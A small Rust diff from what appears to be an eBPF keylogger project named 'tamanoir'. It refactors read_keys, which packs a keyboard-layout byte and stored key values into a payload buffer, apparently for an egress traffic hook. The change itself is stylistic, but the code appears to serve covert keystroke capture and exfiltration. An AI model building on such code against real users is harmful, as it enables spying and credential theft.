@@ -37,9 +37,8 @@ pub fn tamanoir_egress(mut ctx: TcContext) -> i32 {
 fn read_keys() -> [u8; KEYS_PAYLOAD_LEN] {
     let mut res = [0u8; KEYS_PAYLOAD_LEN];
     res[0] = unsafe { core::ptr::read_volatile(&KEYBOARD_LAYOUT) };
-    for k in 1..KEYS_PAYLOAD_LEN {
-        let item = DATA.pop().unwrap_or_default();
-        res[k] = item;
+    for item in res.iter_mut().take(KEYS_PAYLOAD_LEN).skip(1) {
+        *item = DATA.pop().unwrap_or_default();
     }
     res
 }
